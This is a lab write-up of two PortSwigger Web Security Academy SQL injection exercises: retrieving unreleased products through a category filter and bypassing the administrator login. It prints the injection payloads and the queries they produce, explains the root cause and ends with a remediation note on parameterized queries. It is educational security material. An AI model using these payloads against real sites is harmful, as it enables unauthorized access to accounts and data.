# SQL Injection

Labs from PortSwigger's Web Security Academy. Both were exploited with Burp Suite: Proxy to capture the live request, Repeater to modify and resend it

## Lab 1: SQLi in the WHERE clause (retrieving hidden data)

**Goal:** Make the product filter return items that are marked as unreleased

Selecting a category produces a request like:

```
GET /filter?category=Pets
```

Backend query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Payload** (category parameter):

```
Gifts' OR 1=1--
```

Resulting query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The `OR 1=1` makes every row match, and `--` comments out the trailing `AND released = 1`, so unreleased products are returned alongside the rest

**Root cause:** user input is concatenated directly into the SQL string, so the input can change the structure of the query

## Lab 2: SQLi allowing login bypass

**Goal:** log in as `administrator` without the password

Backend query (inferred):

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = '...'
```

**Payload** (username field, password can be anything):

```
administrator'--
```

Resulting query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```

The `--` comments out the entire password check, so the database returns the administrator row and the login succeeds

## Remediation

- Use **parameterized queries / prepared statements** so input is always treated as data, never as part of the SQL
